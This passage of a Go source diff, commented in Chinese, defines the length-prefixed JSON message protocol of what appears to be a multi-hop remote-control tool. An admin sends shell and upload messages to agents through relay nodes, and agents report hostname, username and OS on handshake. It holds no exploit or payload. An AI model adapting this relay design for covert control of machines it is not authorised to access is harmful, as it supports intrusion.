+	MsgRelayPacket   MessageType = "relay_packet"   // 任意层级间透明转发消息
+
+)
+
+// Message 是基本通信结构
+// 结构体经过 JSON 编码后再加上长度前缀发送
+type Message struct {
+	Type    MessageType // such as handshake,shell,upload
+	Payload []byte      // the data to be sent, such as command or file content
+}
+type HandshakePayload struct {
+	Hostname string `json:"hostname"`
+	Username string `json:"username"`
+	OS       string `json:"os"`
+}
+
+// 1. 启动 relay 请求（admin → agentX）
+type StartRelayPayload struct {
+	SelfID     int    `json:"self_id"`     // relay 节点自己的 ID
+	ListenAddr string `json:"listen_addr"` // relay 要监听的地址
+	IDStart    int    `json:"id_start"`    // 分配给该 relay 的编号段起始
+	Count      int    `json:"count"`       // 分配数量（默认1000）
+
+}
+
+// 2. relay 启动成功回报（agentX → admin）
+type RelayReadyPayload struct {
+	SelfID     int    `json:"self_id"`     // relay 节点自己的 ID
+	ListenAddr string `json:"listen_addr"` // 成功监听的地址
+}
+
+// 3. relay 向 admin 上报子节点注册请求
+type RelayRegisterPayload struct {
+	ParentID int       `json:"parent_id"` // relay 的 ID
+	Node     node.Node `json:"node"`      // 新子节点信息
+}
+
+// 4. 注册结果反馈（admin → relay）
+type RelayAckPayload struct {
+	Success bool   `json:"success"`
+	Message string `json:"message,omitempty"` // 可选信息
+}
+
+// 5. 通用转发消息（relay 用于向下或向上传递）
+type RelayPacket struct {
+	DestID int    `json:"dest_id"` // 最终目标节点 ID
+	Data   []byte `json:"data"`    // 原始 Message 的字节流（即 protocol.EncodeMessage(...)）
+}
+
+// EncodeMessage 将Message编码带长度前缀的字节流
+func EncodeMessage(msg Message) ([]byte, error) {
+	data, err := json.Marshal(msg)
+	if err != nil {
+		return nil, err
+	}
+	buf := new(bytes.Buffer)
+	// 写入长度前缀(大端字节序)
+	err = binary.Write(buf, binary.BigEndian, uint32(len(data)))
+	if err != nil {
+		return nil, err
+	}
+	// 写入消息内容
+	_, err = buf.Write(data)
+	if err != nil {
+		return nil, err
+	}
+	return buf.Bytes(), nil
+}
+
+// DecodeMessage 从带长度前缀的字节流解码为Message
+func DecodeMessage(data []byte) (Message, error) {
+	var msg Message
+	if err := json.Unmarshal(data, &msg); err != nil {
+		return msg, fmt.Errorf("decode json: %w", err)
+	}
+	return msg, nil
+}
+
+// ReadMessage 从连接中读取一个完整的消息帧（包括长度前缀和内容）
+func ReadMessage(reader *bytes.Reader) (Message, error) {
+	var length uint32
+	if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
+		return Message{}, fmt.Errorf("read length: %w", err)
+	}
+	msgData := make([]byte, length)
+	if _, err := reader.Read(msgData); err != nil {
+		return Message{}, fmt.Errorf("read payload: %w", err)
+	}
+	return DecodeMessage(msgData)
+
+}
